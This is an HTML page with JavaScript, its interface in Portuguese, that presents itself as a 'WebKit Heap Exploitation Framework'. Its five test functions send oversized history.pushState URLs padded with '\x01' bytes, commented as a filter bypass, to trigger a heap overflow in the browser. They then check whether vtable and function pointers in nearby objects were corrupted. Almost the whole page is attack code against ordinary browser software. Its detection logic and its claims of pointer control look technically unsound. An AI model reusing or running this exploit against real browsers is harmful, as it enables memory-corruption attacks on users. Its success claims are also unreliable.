<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebKit Heap Exploitation - Refined</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ff41;
            padding: 20px;
            line-height: 1.6;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: #1a1f3a;
            border: 2px solid #00ff41;
            border-radius: 8px;
            padding: 25px;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
        }
        h2 {
            color: #ff0066;
            margin-bottom: 15px;
            text-shadow: 0 0 10px #ff0066;
        }
        h3 {
            color: #00ddff;
            margin: 20px 0 10px 0;
            font-size: 1.1em;
        }
        .control-panel {
            background: #0d1129;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
            border-left: 4px solid #00ff41;
        }
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 24px;
            margin: 5px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
        }
        .btn-danger {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
        }
        .btn-safe {
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
        }
        #log {
            background: #000;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid #00ff41;
            font-size: 13px;
        }
        #log div {
            padding: 3px 0;
            border-bottom: 1px solid #0a3d1a;
        }
        .success { color: #00ff41; }
        .warning { color: #ffaa00; }
        .error { color: #ff0066; }
        .info { color: #00ddff; }
        .critical { color: #ff00ff; font-weight: bold; }
        input[type="number"] {
            background: #0d1129;
            border: 1px solid #00ff41;
            color: #00ff41;
            padding: 8px;
            border-radius: 4px;
            width: 100px;
            margin: 0 10px;
        }
        label {
            color: #00ddff;
            font-weight: bold;
            font-size: 13px;
        }
        .config-row {
            margin: 10px 0;
            display: flex;
            align-items: center;
            flex-wrap: wrap;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>üîì WebKit Heap Exploitation - Refined Control</h2>
    <p style="color: #ffaa00; margin-bottom: 20px;">
        <strong>‚ö†Ô∏è Vers√£o Estabilizada:</strong> Controle granular para evitar crashes prematuros e permitir explora√ß√£o controlada.
    </p>

    <div class="control-panel">
        <h3>‚öôÔ∏è Configura√ß√µes Refinadas</h3>
        
        <div class="config-row">
            <label>Base Buffer:</label>
            <input type="number" id="baseSize" value="709522" min="100000" max="800000" step="1000">
            <span style="color: #888; font-size: 11px; margin-left: 10px;">(Tamanho do buffer leg√≠timo)</span>
        </div>
        
        <div class="config-row">
            <label>Overflow Incremental:</label>
            <input type="number" id="overflowIncrement" value="1000" min="100" max="50000" step="100">
            <span style="color: #888; font-size: 11px; margin-left: 10px;">(Tamanho inicial do overflow - aumentar gradualmente)</span>
        </div>
        
        <div class="config-row">
            <label>Delay entre testes (ms):</label>
            <input type="number" id="testDelay" value="2000" min="500" max="10000" step="500">
        </div>

        <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #00ff41;">
            <button class="btn btn-safe" onclick="safeTest_FindBoundary()">üîç Teste Seguro: Encontrar Limite</button>
            <button class="btn btn-safe" onclick="safeTest_IncrementalOverflow()">üìä Overflow Incremental</button>
            <button class="btn" onclick="test_ControlledWrite()">‚úçÔ∏è Teste: Escrita Controlada</button>
            <button class="btn" onclick="test_ObjectCorruption()">üéØ Teste: Corrup√ß√£o de Objeto</button>
            <button class="btn btn-danger" onclick="test_PreciseExploit()">‚ö° Explora√ß√£o Precisa</button>
            <button class="btn" onclick="clearLog()" style="background: #555;">Clear</button>
        </div>
    </div>

    <div id="log"></div>
</div>

<script>
    // ===================================================================
    // VARI√ÅVEIS GLOBAIS
    // ===================================================================
    let testResults = {
        maxSafeSize: 0,
        crashPoint: 0,
        successfulWrites: [],
        corruptedObjects: []
    };

    let targetObjects = [];

    // ===================================================================
    // FUN√á√ïES AUXILIARES
    // ===================================================================
    function log(msg, type = 'info') {
        const el = document.getElementById('log');
        const className = type;
        const timestamp = new Date().toLocaleTimeString();
        el.innerHTML += `<div class="${className}">[${timestamp}] ${msg}</div>`;
        el.scrollTop = el.scrollHeight;
    }

    function clearLog() {
        document.getElementById('log').innerHTML = '';
        log('Log limpo - Sistema pronto', 'success');
    }

    // ===================================================================
    // TESTE 1: ENCONTRAR LIMITE SEGURO (SEM CRASH)
    // ===================================================================
    async function safeTest_FindBoundary() {
        log('‚ïê‚ïê‚ïê TESTE 1: ENCONTRAR LIMITE SEGURO ‚ïê‚ïê‚ïê', 'success');
        log('Testando limites sem causar crash...', 'info');
        
        const baseSize = parseInt(document.getElementById('baseSize').value);
        const delay = parseInt(document.getElementById('testDelay').value);
        
        // Come√ßar com tamanhos pequenos e aumentar gradualmente
        const testSizes = [0, 100, 500, 1000, 5000, 10000, 20000, 50000, 100000];
        
        for (let overflowSize of testSizes) {
            log(`Testando: base=${baseSize} + overflow=${overflowSize}`, 'info');
            
            try {
                const baseBuffer = "A".repeat(baseSize);
                const overflow = "\x01".repeat(overflowSize);
                const payload = "/" + baseBuffer + overflow;
                
                // Usar pushState de forma segura
                history.pushState({}, `test_${overflowSize}`, payload);
                
                // Se chegou aqui, n√£o crashou
                testResults.maxSafeSize = overflowSize;
                log(`‚úì Sucesso com overflow de ${overflowSize} bytes`, 'success');
                
                // Esperar antes do pr√≥ximo teste
                await new Promise(resolve => setTimeout(resolve, delay));
                
            } catch (e) {
                log(`‚ö†Ô∏è Erro com overflow de ${overflowSize}: ${e.message}`, 'error');
                testResults.crashPoint = overflowSize;
                break;
            }
        }
        
        log(`‚ïê‚ïê‚ïê RESULTADO ‚ïê‚ïê‚ïê`, 'success');
        log(`Tamanho seguro m√°ximo: ${testResults.maxSafeSize} bytes`, 'success');
        if (testResults.crashPoint > 0) {
            log(`Ponto de crash detectado: ${testResults.crashPoint} bytes`, 'error');
        }
    }

    // ===================================================================
    // TESTE 2: OVERFLOW INCREMENTAL COM AN√ÅLISE
    // ===================================================================
    async function safeTest_IncrementalOverflow() {
        log('‚ïê‚ïê‚ïê TESTE 2: OVERFLOW INCREMENTAL ‚ïê‚ïê‚ïê', 'success');
        
        const baseSize = parseInt(document.getElementById('baseSize').value);
        let currentOverflow = parseInt(document.getElementById('overflowIncrement').value);
        const delay = parseInt(document.getElementById('testDelay').value);
        
        log('Aumentando overflow gradualmente at√© encontrar corrup√ß√£o...', 'info');
        
        // Criar objetos alvo ANTES do overflow
        targetObjects = [];
        for (let i = 0; i < 5; i++) {
            targetObjects.push({
                id: i,
                marker: 0xDEADBEEF,
                data: new Uint32Array([0x41414141, 0x42424242, 0x43434343, 0x44444444]),
                isValid: true
            });
        }
        log(`Criados ${targetObjects.length} objetos alvo para monitoramento`, 'info');
        
        // Testar incrementalmente
        for (let attempt = 0; attempt < 10; attempt++) {
            log(`\nTentativa ${attempt + 1}: overflow de ${currentOverflow} bytes`, 'warning');
            
            try {
                const baseBuffer = "B".repeat(baseSize);
                
                // Usar padr√£o espec√≠fico no overflow para identificar corrup√ß√£o
                const overflowPattern = "\x01".repeat(currentOverflow);
                
                const payload = "/" + baseBuffer + overflowPattern;
                
                log(`Executando pushState com ${payload.length} bytes totais...`, 'info');
                history.pushState({}, `inc_${attempt}`, payload);
                
                // Verificar integridade dos objetos ap√≥s overflow
                await new Promise(resolve => setTimeout(resolve, 500));
                
                let corrupted = 0;
                for (let obj of targetObjects) {
                    try {
                        // Tentar acessar propriedades
                        const check = obj.marker === 0xDEADBEEF;
                        const dataCheck = obj.data[0] === 0x41414141;
                        
                        if (!check || !dataCheck) {
                            corrupted++;
                            log(`‚ö†Ô∏è Objeto ${obj.id} CORROMPIDO!`, 'error');
                            log(`  Marker: ${obj.marker.toString(16)} (esperado: deadbeef)`, 'error');
                        }
                    } catch (e) {
                        corrupted++;
                        log(`üí• Objeto ${obj.id} DESTRU√çDO: ${e.message}`, 'critical');
                    }
                }
                
                if (corrupted > 0) {
                    log(`\nüéØ CORRUP√á√ÉO DETECTADA! ${corrupted} objetos afetados`, 'success');
                    log(`Tamanho √≥timo: base=${baseSize} + overflow=${currentOverflow}`, 'success');
                    testResults.successfulWrites.push(currentOverflow);
                    break;
                }
                
                log(`‚úì Sem corrup√ß√£o detectada, aumentando overflow...`, 'info');
                currentOverflow += parseInt(document.getElementById('overflowIncrement').value);
                
                await new Promise(resolve => setTimeout(resolve, delay));
                
            } catch (e) {
                log(`\nüí• CRASH em ${currentOverflow} bytes: ${e.message}`, 'error');
                testResults.crashPoint = currentOverflow;
                break;
            }
        }
    }

    // ===================================================================
    // TESTE 3: ESCRITA CONTROLADA EM ENDERE√áO ESPEC√çFICO
    // ===================================================================
    function test_ControlledWrite() {
        log('‚ïê‚ïê‚ïê TESTE 3: ESCRITA CONTROLADA ‚ïê‚ïê‚ïê', 'success');
        log('Tentando escrever padr√£o espec√≠fico em mem√≥ria adjacente...', 'info');
        
        const baseSize = parseInt(document.getElementById('baseSize').value);
        
        try {
            // Criar estrutura alvo
            const target = {
                vtablePtr: 0x12345678,
                dataPtr: new ArrayBuffer(64),
                function_ptr: function() { log('Fun√ß√£o original executada', 'info'); }
            };
            
            log('Objeto alvo criado:', 'info');
            log(`  vtablePtr: 0x${target.vtablePtr.toString(16)}`, 'info');
            
            // Preparar payload com padr√£o espec√≠fico
            const baseBuffer = "C".repeat(baseSize);
            
            // Overflow com padr√£o que tenta sobrescrever ponteiros
            // Usar valores espec√≠ficos para detectar escrita
            let controlledBytes = "";
            for (let i = 0; i < 1000; i++) {
                controlledBytes += "\x01"; // Bypass do filtro
            }
            
            // Adicionar marcador no final
            controlledBytes += "\xEF\xBE\xAD\xDE"; // 0xDEADBEEF em little-endian
            
            const payload = "/" + baseBuffer + controlledBytes;
            
            log(`Executando escrita controlada (${payload.length} bytes)...`, 'warning');
            history.pushState({}, "controlled", payload);
            
            // Verificar se conseguimos modificar o objeto
            setTimeout(() => {
                try {
                    log('Verificando modifica√ß√µes no objeto alvo...', 'info');
                    
                    if (target.vtablePtr !== 0x12345678) {
                        log(`üéØ SUCESSO! vtablePtr modificado para: 0x${target.vtablePtr.toString(16)}`, 'success');
                    }
                    
                    target.function_ptr();
                    
                } catch (e) {
                    log(`‚ö†Ô∏è Objeto corrompido: ${e.message}`, 'error');
                }
            }, 1000);
            
        } catch (e) {
            log(`Erro: ${e.message}`, 'error');
        }
    }

    // ===================================================================
    // TESTE 4: CORRUP√á√ÉO PRECISA DE OBJETO
    // ===================================================================
    function test_ObjectCorruption() {
        log('‚ïê‚ïê‚ïê TESTE 4: CORRUP√á√ÉO PRECISA DE OBJETO ‚ïê‚ïê‚ïê', 'success');
        log('Preparando ambiente para corrup√ß√£o controlada...', 'info');
        
        try {
            // Criar objetos com estrutura espec√≠fica
            const victims = [];
            for (let i = 0; i < 3; i++) {
                victims.push({
                    id: i,
                    buffer: new ArrayBuffer(1024),
                    view: new Uint32Array(256),
                    callback: function() { return `Original_${i}`; }
                });
                victims[i].view[0] = 0xAABBCCDD;
            }
            
            log(`Criadas ${victims.length} v√≠timas com buffers de 1KB`, 'info');
            
            // Overflow calculado para atingir esses objetos
            const baseSize = parseInt(document.getElementById('baseSize').value);
            const baseBuffer = "D".repeat(baseSize);
            
            // Overflow menor e mais preciso
            const preciseOverflow = "\x01".repeat(5000) + "XXXX";
            
            const payload = "/" + baseBuffer + preciseOverflow;
            
            log('Executando corrup√ß√£o precisa...', 'warning');
            history.pushState({}, "precise", payload);
            
            // An√°lise p√≥s-corrup√ß√£o
            setTimeout(() => {
                log('\n‚ïê‚ïê‚ïê AN√ÅLISE P√ìS-CORRUP√á√ÉO ‚ïê‚ïê‚ïê', 'info');
                
                for (let victim of victims) {
                    try {
                        const result = victim.callback();
                        const bufferValue = victim.view[0];
                        
                        log(`V√≠tima ${victim.id}:`, 'info');
                        log(`  Callback: ${result}`, 'info');
                        log(`  Buffer[0]: 0x${bufferValue.toString(16)}`, 'info');
                        
                        if (bufferValue !== 0xAABBCCDD) {
                            log(`  üéØ CORROMPIDO! Valor alterado!`, 'success');
                        }
                    } catch (e) {
                        log(`V√≠tima ${victim.id}: CRASH - ${e.message}`, 'error');
                    }
                }
            }, 1000);
            
        } catch (e) {
            log(`Erro na corrup√ß√£o: ${e.message}`, 'error');
        }
    }

    // ===================================================================
    // TESTE 5: EXPLORA√á√ÉO PRECISA (FINAL)
    // ===================================================================
    function test_PreciseExploit() {
        log('‚ïê‚ïê‚ïê EXPLORA√á√ÉO PRECISA - CONTROLE TOTAL ‚ïê‚ïê‚ïê', 'critical');
        log('‚ö†Ô∏è ATEN√á√ÉO: Este teste pode causar instabilidade', 'warning');
        
        setTimeout(() => {
            try {
                const baseSize = 709522;
                
                // Criar objeto com ponteiro de fun√ß√£o que queremos controlar
                const exploit_target = {
                    magic: 0x41424344,
                    execute: function() { 
                        log('‚ùå Fun√ß√£o original (n√£o deve aparecer)', 'error'); 
                        return 0;
                    }
                };
                
                log('Alvo criado. Tentando sobrescrever ponteiro de fun√ß√£o...', 'info');
                
                // Payload otimizado
                const base = "E".repeat(baseSize);
                const overflow = "\x01".repeat(10000);
                
                history.pushState({}, "final", "/" + base + overflow);
                
                // Tentar executar a fun√ß√£o (potencialmente corrompida)
                setTimeout(() => {
                    try {
                        const result = exploit_target.execute();
                        log(`Resultado da execu√ß√£o: ${result}`, 'info');
                    } catch (e) {
                        log(`üéØ PONTEIRO CORROMPIDO: ${e.message}`, 'success');
                        log('Isso indica controle sobre ponteiros de fun√ß√£o!', 'success');
                    }
                }, 500);
                
            } catch (e) {
                log(`Erro: ${e.message}`, 'error');
            }
        }, 500);
    }

    // Inicializa√ß√£o
    log('WebKit Heap Exploitation Framework - Vers√£o Refinada', 'success');
    log('Use os testes seguros primeiro para mapear o comportamento', 'info');
    log('Comece com "Encontrar Limite" para evitar crashes', 'warning');
</script>

</body>
</html>
